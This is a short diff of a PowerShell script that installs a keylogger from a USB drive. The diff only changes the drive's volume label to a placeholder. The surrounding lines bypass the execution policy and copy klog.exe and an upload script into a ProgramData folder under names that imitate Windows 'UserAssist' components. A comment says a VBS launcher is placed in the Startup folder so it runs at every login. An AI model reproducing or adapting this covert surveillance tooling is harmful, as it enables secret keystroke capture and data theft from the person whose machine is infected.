@@ -3,7 +3,7 @@ Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
 
 #place logger related files in a dedicated directory
 New-Item -ItemType Directory -Force -Path "C:\ProgramData\WindowsUserAssist"
-$drv = (Get-Volume -FileSystemLabel DEVOVER).DriveLetter
+$drv = (Get-Volume -FileSystemLabel YOURNAMELABEL).DriveLetter
 Copy-Item "${drv}:\binaries\klog.exe"  "C:\ProgramData\WindowsUserAssist\UserAssist Klg Host.exe" -Force
 Copy-Item "${drv}:\scripts\upload.ps1" "C:\ProgramData\WindowsUserAssist\UserAssist Updates.ps1" -Force
 #copy autostart.vbs into windows startup directory, to launch the software at every login for current user
